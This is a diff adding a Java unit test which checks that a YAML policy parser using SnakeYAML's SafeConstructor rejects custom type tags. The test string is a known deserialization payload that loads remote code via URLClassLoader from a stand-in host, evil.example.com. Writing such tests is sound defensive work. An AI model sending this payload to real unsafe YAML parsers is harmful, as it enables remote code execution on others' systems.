@@ -143,6 +143,19 @@ public class ReplayPolicyParserTest {
   }
 
   /**
+   * Verifies that YAML containing a custom Java type tag is rejected by SafeConstructor, preventing
+   * arbitrary object deserialization.
+   */
+  @Test(expected = IllegalArgumentException.class)
+  public void rejectsYamlWithCustomJavaTypeTags() {
+    String malicious =
+        "defaultAction: !!javax.script.ScriptEngineManager"
+            + " [!!java.net.URLClassLoader"
+            + " [[!!java.net.URL [\"http://evil.example.com\"]]]]\n";
+    ReplayPolicyParser.parseYaml(malicious);
+  }
+
+  /**
    * Verifies that --re-execute patterns combined with --stub-all-else sets the default action to
    * STUB_FROM_WAL, so all operations not matching --re-execute patterns are stubbed.
    */
